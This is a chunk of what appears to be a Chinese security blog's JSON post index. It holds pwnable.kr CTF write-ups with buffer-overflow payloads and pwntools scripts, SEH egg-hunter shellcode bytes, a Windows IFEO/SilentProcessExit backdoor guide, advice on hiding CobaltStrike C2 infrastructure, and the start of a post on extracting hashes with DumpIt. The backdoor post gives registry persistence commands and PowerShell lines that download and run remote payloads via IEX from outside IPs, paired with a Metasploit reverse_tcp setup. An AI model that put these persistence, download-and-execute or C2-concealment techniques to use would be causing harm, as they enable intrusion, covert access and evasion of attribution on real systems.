filename\\n&quot;\t\tsys.exit(0)\tbin2shellcode(sys.argv[1])\n\n\n\nbin2shellcode2.py\n#!/usr/bin/env python# -*- coding: utf-8 -*-import sysif __name__ == &quot;__main__&quot;:\tif len(sys.argv) &lt; 2:\t\tprint &quot;usage: %s file.bin\\n&quot; % (sys.argv[0],)\t\tsys.exit(0)\tshellcode = &quot;\\&quot;&quot;\tctr = 1\tmaxlen = 15\tfor b in open(sys.argv[1], &quot;rb&quot;).read():\t\tshellcode += &quot;\\\\x&quot; + b.encode(&quot;hex&quot;)\t\tif ctr == maxlen:\t\t\tshellcode += &quot;\\&quot; +\\n\\&quot;&quot;\t\t\tctr = 0\t\tctr += 1\tshellcode += &quot;\\&quot;&quot;\tprint shellcode\n\n\n\nReference\nhttps://blog.techorganic.com/2013/03/02/binary-to-shellcode/\n\n","categories":["Pwn"],"tags":["shellcode","binary-exploitation"]},{"title":"pwnable.kr-bof","url":"/2019/12/pwnable-kr-bof/","content":"题目pawnable地址：http://pwnable.kr/play.php\n题目名称：bof\nNana told me that buffer overflow is one of the most common software vulnerability. Is that true?Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000\n\n\n\n解题过程 下载并查看题中给出的源代码\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n简单分析下，看到有两个函数main和func。\nmain函数中调用了func函数，并传递给func函数的参数为0xdeadbeef ；\nfunc函数接收一个名为key的整型变量作为参数，定义了一个长度为32字节的数组overflowme。然后打印一段话overflow me : ；接着获取输入内容，并保存到overflowme中。最后是一个if判断语句，如果key的值为0xcafebabe，则getshell，否则将打印Nah..\\n。\n程序逻辑很简单，那么如果想getshell，正常情况是使key的值为0xcafebabe，但由于key的值在目标程序中不可控，因此只能利用缓冲区溢出的方式，利用缓冲区溢出的方式也有两种思路：\n\n思路一：覆盖key的值，使其等于0xcafebabe ；\n思路二：覆盖返回地址的值，直接跳转到system(&quot;/bin/sh&quot;)所在的内存地址，执行该指令。\n\n下面使用gdb进行调试，建议使用必要的插件如peda、gef。\n$ gdb ./bofgef➤  b mainBreakpoint 1 at 0x68dgef➤  run\n\n使用gdb加载后，在main函数处下个断点，然后run启动程序。\n思路一第一种思路是覆盖key的值，使其等于0xcafebabe，因此我们需要找到做字符串比较时的内存位置，然后在这个地址处对key的值进行溢出覆盖。\n反汇编func函数，找到key == 0xcafebabe比较指令的汇编代码：\ngef➤  disassemble func Dump of assembler code for function func:   0x8000062c &lt;+0&gt;:\tpush   ebp   0x8000062d &lt;+1&gt;:\tmov    ebp,esp   0x8000062f &lt;+3&gt;:\tsub    esp,0x48   0x80000632 &lt;+6&gt;:\tmov    eax,gs:0x14   0x80000638 &lt;+12&gt;:\tmov    DWORD PTR [ebp-0xc],eax   0x8000063b &lt;+15&gt;:\txor    eax,eax   0x8000063d &lt;+17&gt;:\tmov    DWORD PTR [esp],0x8000078c   0x80000644 &lt;+24&gt;:\tcall   0xb7dc9ca0 &lt;_IO_puts&gt;   0x80000649 &lt;+29&gt;:\tlea    eax,[ebp-0x2c]   0x8000064c &lt;+32&gt;:\tmov    DWORD PTR [esp],eax   0x8000064f &lt;+35&gt;:\tcall   0xb7dc93e0 &lt;_IO_gets&gt;   0x80000654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe   0x8000065b &lt;+47&gt;:\tjne    0x8000066b &lt;func+63&gt;   0x8000065d &lt;+49&gt;:\tmov    DWORD PTR [esp],0x8000079b   0x80000664 &lt;+56&gt;:\tcall   0xb7da4da0 &lt;__libc_system&gt;   0x80000669 &lt;+61&gt;:\tjmp    0x80000677 &lt;func+75&gt;   0x8000066b &lt;+63&gt;:\tmov    DWORD PTR [esp],0x800007a3   0x80000672 &lt;+70&gt;:\tcall   0xb7dc9ca0 &lt;_IO_puts&gt;   0x80000677 &lt;+75&gt;:\tmov    eax,DWORD PTR [ebp-0xc]   0x8000067a &lt;+78&gt;:\txor    eax,DWORD PTR gs:0x14   0x80000681 &lt;+85&gt;:\tje     0x80000688 &lt;func+92&gt;   0x80000683 &lt;+87&gt;:\tcall   0xb7e614c0 &lt;__stack_chk_fail&gt;   0x80000688 &lt;+92&gt;:\tleave     0x80000689 &lt;+93&gt;:\tret    End of assembler dump.\n\n这里看到了cmp比较指令：\n0x80000654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe\n\n这条指令的地址为0x80000654，于是我们在这里下断点。\ngef➤  b *0x80000654Breakpoint 4 at 0x80000654\n\n然后继续执行（c）程序，此时进入交互模式，我们输入数据，比如AAAAAAAAAAAAAAAAAAAAAAAAA。输入后，会在刚才的断点停下。\n\nps：因为不是利用覆盖返回地址的思路，因此不必给一个很长的数来确定造成程序崩溃的缓冲区长度。\n\n我们使用ni指令继续执行下一条指令，即执行完cmp比较指令，然后查看下esp寄存器的值。\ngef➤  ni gef➤  disas func Dump of assembler code for function func:   0x8000062c &lt;+0&gt;:\tpush   ebp   0x8000062d &lt;+1&gt;:\tmov    ebp,esp   0x8000062f &lt;+3&gt;:\tsub    esp,0x48   0x80000632 &lt;+6&gt;:\tmov    eax,gs:0x14   0x80000638 &lt;+12&gt;:\tmov    DWORD PTR [ebp-0xc],eax   0x8000063b &lt;+15&gt;:\txor    eax,eax   0x8000063d &lt;+17&gt;:\tmov    DWORD PTR [esp],0x8000078c   0x80000644 &lt;+24&gt;:\tcall   0xb7dc9ca0 &lt;_IO_puts&gt;   0x80000649 &lt;+29&gt;:\tlea    eax,[ebp-0x2c]   0x8000064c &lt;+32&gt;:\tmov    DWORD PTR [esp],eax   0x8000064f &lt;+35&gt;:\tcall   0xb7dc93e0 &lt;_IO_gets&gt;   0x80000654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe=&gt; 0x8000065b &lt;+47&gt;:\tjne    0x8000066b &lt;func+63&gt;   0x8000065d &lt;+49&gt;:\tmov    DWORD PTR [esp],0x8000079b   0x80000664 &lt;+56&gt;:\tcall   0xb7da4da0 &lt;__libc_system&gt;   0x80000669 &lt;+61&gt;:\tjmp    0x80000677 &lt;func+75&gt;   0x8000066b &lt;+63&gt;:\tmov    DWORD PTR [esp],0x800007a3   0x80000672 &lt;+70&gt;:\tcall   0xb7dc9ca0 &lt;_IO_puts&gt;   0x80000677 &lt;+75&gt;:\tmov    eax,DWORD PTR [ebp-0xc]   0x8000067a &lt;+78&gt;:\txor    eax,DWORD PTR gs:0x14   0x80000681 &lt;+85&gt;:\tje     0x80000688 &lt;func+92&gt;   0x80000683 &lt;+87&gt;:\tcall   0xb7e614c0 &lt;__stack_chk_fail&gt;   0x80000688 &lt;+92&gt;:\tleave     0x80000689 &lt;+93&gt;:\tret    End of assembler dump.gef➤  x/30wx $esp0xbfffed20:\t0xbfffed3c\t0xbfffedc4\t0xb7fd44e8\t0xb7fd445c0xbfffed30:\t0xffffffff\t0xb7d66000\t0xb7d76dc8\t0x414141410xbfffed40:\t0x41414141\t0x41414141\t0x41414141\t0x414141410xbfffed50:\t0x41414141\t0x00000041\t0x80001ff4\t0xa4256d000xbfffed60:\t0xb7f1c000\t0xb7f1c000\t0xbfffed88\t0x8000069f0xbfffed70:\t0xdeadbeef\t0x80000250\t0x800006b9\t0x000000000xbfffed80:\t0xb7f1c000\t0xb7f1c000\t0x00000000\t0xb7d826370xbfffed90:\t0x00000001\t0xbfffee24gef➤  x/wx $ebp0xbfffed78:\t0xbfffed98\n\n进行对比操作时，key的值为0xdeadbeef，内存地址是0xbfffed80。到这里我们就可以计算出我们的输入位置与0xdeadbeef之间的偏移距离，即图中画绿框的部分。\n\n每个十六进制值代表4个字节，因此偏移的距离就是13*4=52个字节，因此我们需要输入52个字母A来进行填充占位，并继续填充把key的值覆盖成我们想要的值0xcafebabe。\n到这里就可以构造payload了，首先使用52个A进行填充，然后在最后位置填充0xcafebabe 。生成payload：\npython -c &quot;print &#x27;A&#x27;*52 + &#x27;\\xbe\\xba\\xfe\\xca&#x27;&quot; &gt; ./payload\n\n通过管道传输给nc，并连接pwnable.kr进行验证。\n(cat payload &amp;&amp; cat) | nc pwnable.kr 9000\n\n\n思路二覆盖返回地址的值，直接跳转到system(&quot;/bin/sh&quot;)指令的内存地址，执行该指令。\n首先确认能够造成缓冲区溢出，覆盖返回地址的最小数据长度。\n与上面一样的操作，同样在gdb中调试，我们在0x80000654处下断点，继续运行程序，随便输入一些填充数据，这里我输入了25个A。输入ni继续执行，即执行完cmp指令，此时查看$esp的值。\ngef➤  x/20wx $esp0xbfffed40:\t0xbfffed5c\t0xbfffede4\t0xb7fd44e8\t0xb7fd445c0xbfffed50:\t0xffffffff\t0xb7d66000\t0xb7d76dc8\t0x414141410xbfffed60:\t0x41414141\t0x41414141\t0x41414141\t0x414141410xbfffed70:\t0x41414141\t0x41414141\t0x41414141\t0x004141410xbfffed80:\t0xb7f1c000\t0xb7f1c000\t0xbfffeda8\t0x8000069fgef➤  x/wx $ebp0xbfffed88:\t0xbfffeda8\n\n可以看到此时ebp的地址在0xbfffed88处，我们输入的数据长度还不足以覆盖到返回地址。从input start位置到ebp的距离为\n\npython -c &quot;print &#x27;A&#x27; * 48 + &#x27;\\x5d\\x06\\x00\\x80&#x27;&quot; &gt; ./payload\n\n\n\n\n\npwntools漏洞利用思路1#!/usr/bin/pythonfrom pwn import *payload = &#x27;A&#x27; * 52 + &#x27;\\xbe\\xba\\xfe\\xca&#x27;shell = remote(&#x27;pwnable.kr&#x27;,9000)shell.send(payload)shell.interactive()\n\n\n\n\n\n参考\n\nhttps://0xrick.github.io/pwn/bof/\nhttps://0xrick.github.io/binary-exploitation/bof6/\nhttps://taishi8117.github.io/2016/07/24/bof-metasploit/\n一些pwn题目的解题思路-pwnable-kr\nhttps://bbs.ichunqiu.com/article-1742-1.html\n\n","categories":["Pwn"],"tags":["binary-exploitation","pwnable.kr","buffer-overflow"]},{"title":"pwnable.kr-fd","url":"/2019/12/pwnable-kr-fd/","content":"题目pwnable地址：http://pwnable.kr/play.php\n题目名称：fd\nMommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222 (pw:guest)\n\n\n\n解题过程查看文件\n$ ls -al-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag\n\n查看fd.c源码\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];\t\t//创建一个32字节的缓冲区int main(int argc, char* argv[], char* envp[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;pass argv[1] a number\\n&quot;);\t\treturn 0;\t&#125;\tint fd = atoi( argv[1] ) - 0x1234;\t\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(&quot;LETMEWIN\\n&quot;, buf))&#123;\t\tprintf(&quot;good job :)\\n&quot;);\t\tsystem(&quot;/bin/cat flag&quot;);\t\texit(0);\t&#125;\tprintf(&quot;learn about Linux file IO\\n&quot;);\treturn 0;&#125;\n\n一些函数解释：\n\natoi函数的作用是将开头包含数字的字符串转换成int类型整数。\nread函数的作用是从文件描述符fd读取一定字节长度的数据到缓冲区，read(int fd, void *buf, size_t count)，其中第一个参数fd的值代表文件描述符。这里的作用是获取键盘的标准输入内容，并放到缓冲区中。\nstrcmp是一个字符串比较函数，用于比较两个字符串的ASCII大小。实际比较大小是根据第一个参数ASCII值减去第二个ASCII值的结果判断的。如果两个字符串数值相等，则返回0 。\n! 代表逻辑取反，即：把非0的数值变为0，0变为1;\n\n通过分析程序逻辑，可以想到，如果满足if(!strcmp(&quot;LETMEWIN\\n&quot;, buf))判断条件，即!strcmp(&quot;LETMEWIN\\n&quot;, buf))值为1时（即strcmp(&quot;LETMEWIN\\n&quot;, buf)值为0），就能够执行命令查看flag的内容。而当 buf == &quot;LETMEWIN\\n时，strcmp返回结果为0。因此我们需要交互式输入的内容为LETMEWIN，然后按下回车键，这样能够使buf的值为LETMEWIN\\n。\n但是如果从键盘获取输入，文件描述符fd的值需要为0。代码中，fd的值由我们命令行输入的参数值转换成整数后，减去0x1234（即十进制4660）得到的，那么如果我们输入的值也是4460，经过计算后fd的就正好为0，这样我们就可以进行IO输入操作了。\n操作\n$./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!\n\nflag：mommy! I think I know what a file descriptor is!!\npwntools漏洞利用pwntools文档\n#!/usr/bin/pythonfrom pwn import *#建立ssh连接shell = ssh(&#x27;fd&#x27; ,&#x27;pwnable.kr&#x27; ,password=&#x27;guest&#x27;, port=2222)#执行程序process = shell.process(executable=&#x27;./fd&#x27;, argv=[&#x27;fd&#x27;,&#x27;4660&#x27;])\t# 发送LETMEWIN并读取输出process.sendline(&#x27;LETMEWIN&#x27;)print process.recv()\n\n执行结果：\n\nLinux 标准输入输出linux贯彻”一切皆文件”的思想，任何操作都可以看作是对文件的读写。Linux通过标准输入输出(I&#x2F;O)的方式实现对这些文件读写，在这个过程中，Linux会根据一个非负整数来标识对文件的读写操作，这个非负整数叫做文件描述符(file descriptor, fd)，它有3个值，分别为0、1、2。\n\nI&#x2F;O即标准输入(stdin)、标准输出(stdout)、标准错误输出(stderr)。标准输入即是从键盘输入，标准输出、标准错误输出即输出到终端，显示到屏幕。\n\n文件描述符详解：\n\n\n\nI&#x2F;O\nFD\n重定向操作符\n含义\n\n\n\nstandard input (STDIN)\n0\n&lt; 或 &lt;&lt;，0&lt; 或0&lt;&lt;\n读取输入的位置\n\n\nstandard output (STDOUT)\n1\n&gt; 或 &gt;&gt;，1&gt; 或 1&gt;&gt;\n写入输出的位置\n\n\nstandard error (STDERR)\n2\n2&gt; 或 2&gt;&gt;\n写入错误消息的位置\n\n\n参考\n\nhttps://0xrick.github.io/pwn/fd/\n\nhttps://taishi8117.github.io/2015/10/26/pwnable-easy1/\n\n\n","categories":["Pwn"],"tags":["binary-exploitation","buffer-overflow","c"]},{"title":"pwn基础","url":"/2019/12/pwn%E5%9F%BA%E7%A1%80/","content":"https://www.cnblogs.com/countfatcode/p/11756258.html\n参考\n\nhttps://0xrick.github.io/pwn/bof/\nhttps://0xrick.github.io/binary-exploitation/bof6/\nhttps://taishi8117.github.io/2016/07/24/bof-metasploit/\n一些pwn题目的解题思路-pwnable-kr\nhttps://bbs.ichunqiu.com/article-1742-1.html\n\n","categories":["Pwn"],"tags":["c"]},{"title":"shellcode开发-Egg Hunter","url":"/2020/01/shellcode%E5%BC%80%E5%8F%91-egg-hunter/","content":"简介Egg hunter是一种shellcode利用技术，它可以归类到Staged shellcode中，即分段执行shellcode。当劫持了程序的执行流程，但是缓冲区太小而无法存储攻击载荷时，可以使用这种技术。Egg hunter的思想是：把较大的shellcode放到内存的其他足够空间里，然后在易受攻击但空间较小的缓冲区内，只存放一段小shellcode执行。这个小shellcode的功能是搜索并执行内存中的大shellcode。这就类似于Web安全中利用小马上传大马。\n在这个过程中，有两个重要的角色：\n\nHunter：一段shellcode代码，用于从内存中搜索大shellcode位置，执行大shellcode\nEgg：一个特殊的字符串标志，在搜索时能够让我们定位大shellcode的位置。\n\nEgg的值通常由一个4位的字符串Tag拼接两次而来。比如Tag为ssoo，则Egg就是ssoossoo，这样标记足够独特，避免搜索时搜到的是其他内存中的数据。在开发shellcode时，我们设置Tag就行。\n但是如何从内存中搜索呢？想深入了解原理可以读一下这篇文章《Safetly Searching Process Virtual Address Space》。内存扫描时，会从内存0x00处通过递增地址依次访问内存，当出现无法访问的地址时会由一些判断逻辑或者策略进行处理，防止程序崩溃。操作系统提供了一些系统调用，用来判断内存区域是否有效，如果遇到无效的内存地址，大多数系统调用会返回EFAULT。常见系统调用：\n\nLinux：access(2) 、access(2) revisited、sigaction(2)\nWindows：IsBadReadPtr、NtDisplayString、NTAccessCheckAndAuditAlarm、SEH\n\negg hunter流程图如下所示：\n\negghunter利用条件：\n（1）覆盖EIP之前的缓冲区空间也位于内存中的某个位置，并且\n（2）缓冲区段也可能存储在完全不同的内存区域中。如果其他缓冲区空间近在咫尺，您可以通过“跳转到偏移量”到达那里\n（3）搜索标记\nhunter代码也可能会出现坏字符，需要注意\n各种类型的egghunter的大小情况如下：\n\n\n\nLinux\naccess(2)\nsigaction(2)\naccess(2) revisited\n\n\n\n\nSize\n39\n30\n35\n\n\n\nWindows\nIsBadReadPtr\nNtDisplayString\nNTAccessCheckAndAuditAlarm\nSEH\n\n\nSize\n37\n32\n32\n60\n\n\nSEH egghunterSEH (Structured Exception Handling) ，结构化异常处理，使用SEH时如果程序抛出异常，可以响应或消除该异常。在egg hunter中，可以使用SEH来处理访问到非法地址时的异常。下面就用SEH方式来实现egg hunter。\nEB21       \t\t\t\t\tjmp short 0x2359         \t\t\t\t\tpop ecxB873736f6f\t\t\t\t  mov eax,0x73736f6f\t; tag ssoo 73736f6f51         \t\t\t\t\tpush ecx6AFF       \t\t\t\t\tpush byte -0x133DB       \t\t\t\t\txor ebx,ebx648923     \t\t\t\t\tmov [fs:ebx],esp6A02       \t\t\t\t\tpush byte +0x259         \t\t\t\t\tpop ecx8BFB      \t\t\t\t  mov edi,ebxF3AF       \t\t\t\t\trepe scasd7507       \t\t\t\t\tjnz 0x20FFE7       \t\t\t\t\tjmp edi6681CBFF0F \t\t\t\t\tor bx,0xfff43         \t\t\t\t\tinc ebxEBED       \t\t\t\t\tjmp short 0x10E8DAFFFFFF \t\t\t\t\tcall 0x26A0C       \t\t\t\t\tpush byte +0xc59         \t\t\t\t\tpop ecx8B040C     \t\t\t\t\tmov eax,[esp+ecx]B1B8       \t\t\t\t\tmov cl,0xb883040806   \t\t\t\t\tadd dword [eax+ecx],byte +0x658         \t\t\t\t\tpop eax83C410     \t\t\t\t\tadd esp,byte+0x1050         \t\t\t\t\tpush eax33C0       \t\t\t\t\txor eax,eaxC3         \t\t\t\t\tret\n\nhunter\nhunter = (&quot;\\xeb\\x21\\x59\\xb8&quot;&quot;ssoo&quot;\t\t#tag ssoo =&gt; \\x73\\x73\\x6F\\x6F&quot;\\x51\\x6a\\xff\\x33\\xdb\\x64\\x89\\x23\\x6a\\x02\\x59\\x8b\\xfb&quot;&quot;\\xf3\\xaf\\x75\\x07\\xff\\xe7\\x66\\x81\\xcb\\xff\\x0f\\x43\\xeb&quot;&quot;\\xed\\xe8\\xda\\xff\\xff\\xff\\x6a\\x0c\\x59\\x8b\\x04\\x0c\\xb1&quot;&quot;\\xb8\\x83\\x04\\x08\\x06\\x58\\x83\\xc4\\x10\\x50\\x33\\xc0\\xc3&quot;)\n\nSEH实现的egghunter中，hunter的大小为60字节。\n!mona egg -t w00t\n\n\n\n\n\negghunter问题遇到坏字符怎么办？\nhttps://www.fuzzysecurity.com/tutorials/expDev/4.html\nhttps://armoredcode.com/blog/a-closer-look-to-msf-egghunter/\nReferencehttps://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/\nhttps://www.zzz4ck.com/blog/2019/06/30/egg_hunter_SEH/\nhttps://www.fuzzysecurity.com/tutorials/expDev/4.html\n","categories":["Pwn"],"tags":["shellcode","egg-hunter"]},{"title":"Windows后门-映像劫持","url":"/2019/12/windows%E5%90%8E%E9%97%A8-%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81/","content":"映像劫持映像劫持（IFEO，Image File Execution Options）是微软提供给开发者的一个调试功能，用于把程序加载到调试器执行，通过劫持的方式由调试程序调用启动目标进程。该功能取决于注册表项Image File Execution Options下的相关项。关于利用IFEO调试进程的可以参考网上的相关文章。\nIFEO可以通过注册表工具regedit.exe手工操作，也可以通过GFlags工具设置。IFEO注册表项完整路径：\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\n\ngflags工具是包含在Windows Debugging Tools (WinDbg)工具包中的一个全局标志编辑器，下载链接，安装之后：\n\n双击打开gflags.exe，选择Image File标签\n在Image栏里输入你希望调试的程序名。比如sethc.exe，Tab键刷新\n勾选Debugger并输入C:\\windows\\system32\\cmd.exe\n\n\n这是一个shift后门的示例。当点击应用后，sethc.exe程序会被劫持，正常情况下应该是劫持到Debugger所指定的调试器程序，由调试器程序启动目标进程，只是这里我们直接劫持使得执行的程序是cmd.exe。\n进程静默退出监视特性从Win7开始，系统增加了Monitoring Silent Process Exit特性，可以在进程静默退出时启动监视进程。其实这是给调试程序提供的事件报告功能，当程序静默退出时使用下面的几种方法进行报告。报告模式 (ReportingMode)定义如下：\n\n\n\nFlag\n值\n作用\n\n\n\nLAUNCH_MONITORPROCESS\n0x01\n检测到静默退出时，启动监视进程\n\n\nLOCAL_DUMP\n0x02\n检测到静默退出时，将为受监视的进程以及导致终止的创建一个转储文件\n\n\nNOTIFICATION\n0x04\n检测到静默退出时，会弹出一个通知提示\n\n\n该特性开关由注册表项HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\下的GlobalFlag键值决定。\n其中第一种通知方式的监视进程可以由用户指定，在gflags.exe中设置：\n\n这个示例会在notepad程序退出时，启动一个指定的程序。此时Image File Execution Options项下notepad.exe项会被设置GlobalFlag标志，并且SilentProcessExit项下会被指定MonitorProcess、ReportingMode，决定了监控进程路径及报告方式。\n\n这种方式Autoruns监测工具的”Image Hijacks”无法检测到。\n\nshift映像劫持后门后门效果1​    连续键入5次Shift键会会执行cmd.exe弹出命令行窗口\n操作方法：\n\n定位到注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下，新建一个项，项名为sethc.exe；\n在右侧新建一个字符串值(REG_SZ)，数值名称为Debugger，值的内容为cmd.exe的执行路径C:\\windows\\system32\\cmd.exe。\n\n命令行操作命令：\nreg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f\n\n恢复命令：\nreg delete &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /f\n\n\n\n后门效果2​    连续键入5次Shift键，正常执行sethc.exe程序，当sethc.exe点”否”退出时，会执行cmd.exe弹出命令行窗口。\n操作方法：\n\n定位到注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下，新建一个项，项名为sethc.exe；\n在右侧新建一个字符串值 DWORD (REG_DWORD)，数值名称为GlobalFlag，值的内容为十进制512；\n定位到注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit下，新建一个项，项名为sethc.exe；\n在右侧新建一个字符串值(REG_SZ)，数值名称为MonitorProcess，值的内容为cmd.exe的执行路径C:\\windows\\system32\\cmd.exe；\n继续在此处新建一个字符串值 DWORD (REG_DWORD)，数值名称为ReportingMode，值的内容为十进制1。\n\n命令行操作命令：\nreg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1  /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f\n\n恢复命令：\nreg delete &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /freg delete &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /f\n\n\n\n其他程序的劫持这里是一个示例，当关闭notepad.exe时，会出发目标系统上的一个CobaltStrike木马，获得反弹shell。\nuse exploit/multi/script/web_deliveryset payload windows/meterpreter/reverse_tcpset LHOST xxxxset LPORT 9999set target 2  (PSH)exploit\n\n执行后生成攻击命令：\npowershell.exe -nop -w hidden -c $d=new-object net.webclient;$d.proxy=[Net.WebRequest]::GetSystemWebProxy();$d.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $d.downloadstring(&#x27;http://192.167.19.147:8080/6sT7UfJIvMu&#x27;);\n\n在目标系统注册表项添加后门\nreg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v MonitorProcess /d &quot;C:\\Windows\\System32\\artifact.exe&quot;\n\n攻击效果：\n\n使用powershell等命令也可以，不过会有个黑框一闪而过\nreg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v MonitorProcess /d &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://47.94.173.110:80/a&#x27;))\\&quot;&quot;\n\n\n\n 参考\n\nhttps://attack.mitre.org/techniques/T1183/\nhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1183/T1183.md\nhttps://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\nhttps://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\n\n","categories":["APT"],"tags":["后渗透","后门","权限维持"]},{"title":"cobaltstrike反溯源","url":"/2020/05/cobaltstrike%E5%8F%8D%E6%BA%AF%E6%BA%90/","content":"修改默认通信端口CobaltStrike客户端服务器默认通信端口为50050，可以修改teamserver文件，将50050端口改成其他端口。\n修改默认证书cobaltstrike.store是cobalt strike服务器端默认使用的证书密钥库文件，里面包含了一些特征，我们可以自己生成新的证书库，或者通过cloudflare申请的密钥库代理。\n注意，这个证书与通过https上线使用的证书是不一样的，如果想要修改https上线的证书，需要修改Malleable C2 profile。\n# 查看默认store文件keytool -list -v -keystore cobaltstrike.store# 生成新的证书秘钥库keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias you_name -dname &quot;CN=alibaba.com OU=Alibaba Cloud, O=Alibaba, L=HangZhou, ST=HangZhou, C=01&quot;# 迁移到行业标准格式PKCS12keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12\n\n在启动CobaltStrike的时候，指定一个profile文件，然后在profile文件中配置上线时使用的store证书文件即可修改上线时默认的证书。可以将生成证书的命令加入teamserver启动脚本的generate a certificate部分，这样如果启动时检测不到就会自动生成。\n常见配置Malleable-C2-Profiles：https://github.com/rsmudge/Malleable-C2-Profiles.git\n域名上线免费域名注册freenom\n辅助在线工具\n\nhttps://en.ipip.net/i\n老外信息生成：http://haoweichi.com/Index/custom_result\n临时邮箱：https://temp-mail.org/\n\n不要用freenom自带的域名解析服务，因为它自带的没上CDN ping一下域名就知道VPS ip了\nCDN、云函数结合CDN、云函数进行上线。注意某些CDN服务的特殊性。如Cloudflare仅支持部分特定端口，使用其他端口无法连接。Cloudflare支持端口如下：\n\nhttp：80,8080,8880,2052,2082,2086,2095\nhttps：443,2053,2083,2087,2096,8443\n\n其他技术\n域前置\nDomain Borrowing\n域前置 with TLS 1.3\n\n参考如何隐蔽你的C2\nC2服务隐藏\nhttps://www.freebuf.com/articles/network/262445.html\n反溯源-cs和msf域名上线\n","categories":["神兵利器","攻防渗透"],"tags":["Anonymous","CobaltStrike"]},{"title":"使用DumpIt从RAM转储中提取Hash","url":"/2020/12/%E4%BD%BF%E7%94%A8dumpit%E4%BB%8Eram%E8%BD%AC%E5%82%A8%E4%B8%AD%E6%8F%90%E5%8F%96hash/","content":"DumpItDumpIt是一个故障转储工具，该工具是免费的Comae Memory Toolkit的一部分(此工具的早期版本由MoonSols发行，已不再可用)。DumpIt可以获取主机物理内存的快照，并支持使用相关内存取证分析工具如Volatility Framework 、Rekall或Redline 等进行分析。\n该工具不适用红队渗透过程，因为产生的转储文件非常巨大，该方法通常用于恶意软件分析。\nDumpIt下载地址：\n\nhttps://github.com/thimbleweed/All-In-USB/tree/master/utilities/DumpIt\n\nhttps://mega.nz/#!gnBR1Q4Y!2jqIWppIM-ENT0eDZNn6t30ygKRlyUQVFr3fdjdKULQ\n\n\n使用DumpIt用户密码以散列格式存储在%SystemRoot%/system32/config/SAM文件中，我们用DumpIt转储内存快照，然后使用Volatility分析SAM文件，从中找到hash。\nVolatility安装脚本。从2.4开始，Volatility具有适用于Windows、Linux 和OSX的二进制包，下载链接。\n使用Volatility进行分析，需要先根据转储文件的操作系统加载对应的配置文件进行处理。查看转储文件信息，从”Suggested Profile”中选择对应的系统：\n$ python vol.py imageinfo -f TEST7-PC-20200117-042206.rawVolatility Foundation 